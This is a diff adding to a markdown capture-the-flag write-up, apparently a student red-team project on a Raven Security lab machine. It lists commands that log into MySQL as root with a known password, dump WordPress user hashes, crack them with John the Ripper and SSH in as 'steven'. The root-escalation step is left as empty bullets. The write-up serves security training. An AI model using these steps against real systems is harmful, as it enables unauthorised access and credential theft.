@@ -92,7 +92,40 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 
 ![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/sp_post.png)
 
+- **Flag4: 715dea6c055b9fe3337544932f2941ce**
+- Exploit Used:
+    - Recieve 'hash' password for both Michael and Steven byb using the same MySQL exploit from flag3.
+        - Commands:
+            - `mysql -u root -pR@v3nSecurity`
+            - `connect wordpress`
+            - `show tables`
+            - `seletct * from wp_users;`
 
+![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/tables.png)
+
+   - Created a .txt file of 'hash' passwords
+    - `nano wp_hash.txt`
+
+![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/wphash.png)    
+
+   - Used John the Ripper to unhash Steven's password
+    - `john wp_hash.txt`
+    - `john --show wp_hash.txt`
+
+![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/password.png)
+
+- Accessing user Steven
+    - `ssh steven@192.168.1.110`
+    - Password: `pink84`
+
+![](https://github.com/jamesdewhirst/FinalProject/blob/main/Images/sshsteven.png)
+
+- Use Python to gain root privileges
+    - `
+    - `
+    - `
+    - `
+    - `
 
 
 
